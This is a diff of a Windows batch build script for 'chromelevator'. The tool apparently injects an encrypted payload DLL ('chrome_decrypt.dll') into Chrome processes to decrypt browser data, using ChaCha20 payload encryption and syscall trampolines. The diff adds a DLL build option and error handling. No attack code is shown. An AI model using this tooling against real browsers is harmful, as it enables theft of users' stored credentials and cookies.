@@ -9,6 +9,9 @@ set "BUILD_DIR=build"
 set "SRC_DIR=src"
 set "LIBS_DIR=libs"
 set "FINAL_EXE_NAME=chromelevator.exe"
+set "FINAL_DLL_NAME=chromelevator.dll"
+set "FINAL_OUTPUT_NAME=%FINAL_EXE_NAME%"
+set "BUILD_AS_DLL=0"
 set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
 set "PAYLOAD_HEADER=payload_data.hpp"
@@ -28,6 +31,7 @@ if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
 :: Parse command line arguments
 if "%1"=="build_encryptor_only" goto :build_encryptor
 if "%1"=="build_target_only" goto :build_target
+if "%1"=="build_target_dll" set "BUILD_AS_DLL=1" & set "FINAL_OUTPUT_NAME=%FINAL_DLL_NAME%" & goto :build_target
 if "%1"=="clean" goto :clean
 
 
@@ -43,6 +47,7 @@ goto :done
 echo Cleaning build directory...
 if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
 if exist "%FINAL_EXE_NAME%" del /q "%FINAL_EXE_NAME%"
+if exist "%FINAL_DLL_NAME%" del /q "%FINAL_DLL_NAME%"
 echo Clean complete.
 goto :eof
 
@@ -59,13 +64,19 @@ goto :eof
 
 :build_target
 call :compile_sqlite
+if errorlevel 1 exit /b %errorlevel%
 call :compile_payload
+if errorlevel 1 exit /b %errorlevel%
+call :compile_encryptor
+if errorlevel 1 exit /b %errorlevel%
 call :encrypt_payload
+if errorlevel 1 exit /b %errorlevel%
 call :compile_injector
+if errorlevel 1 exit /b %errorlevel%
 echo.
 echo =============================================================================
-echo [+] Build Complete: %FINAL_EXE_NAME%
-for %%A in (".\%FINAL_EXE_NAME%") do echo [+] Binary Size: %%~zA bytes
+echo [+] Build Complete: %FINAL_OUTPUT_NAME%
+for %%A in (".\%FINAL_OUTPUT_NAME%") do echo [+] Binary Size: %%~zA bytes
 echo =============================================================================
 goto :eof
 
@@ -135,20 +146,30 @@ cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_serv
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
 
-link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
-    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
-    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
-    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
-    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
-    "%BUILD_DIR%\syscall_trampoline.obj" ^
-    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+if "%BUILD_AS_DLL%"=="1" (
+    link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:".\%FINAL_OUTPUT_NAME%" ^
+        "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
+        "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
+        "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
+        "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
+        "%BUILD_DIR%\syscall_trampoline.obj" ^
+        version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+) else (
+    link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_OUTPUT_NAME%" ^
+        "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
+        "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
+        "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
+        "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
+        "%BUILD_DIR%\syscall_trampoline.obj" ^
+        version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+)
 goto :eof
 
 :done
 echo.
 echo =============================================================================
-echo [+] Build Complete: %FINAL_EXE_NAME%
-for %%A in (".\%FINAL_EXE_NAME%") do echo [+] Binary Size: %%~zA bytes
+echo [+] Build Complete: %FINAL_OUTPUT_NAME%
+for %%A in (".\%FINAL_OUTPUT_NAME%") do echo [+] Binary Size: %%~zA bytes
 echo =============================================================================
 echo.
 echo Cleaning up build artifacts...
@@ -166,5 +187,5 @@ del /q "*.obj" 2>nul
 echo [+] Cleaned intermediate object files
 echo [+] Removed temporary artifacts
 echo.
-echo Build artifacts: %FINAL_EXE_NAME% + %BUILD_DIR%\chrome_decrypt.dll + %BUILD_DIR%\chrome_decrypt.enc
+echo Build artifacts: %FINAL_OUTPUT_NAME% + %BUILD_DIR%\chrome_decrypt.dll + %BUILD_DIR%\chrome_decrypt.enc
 goto :eof
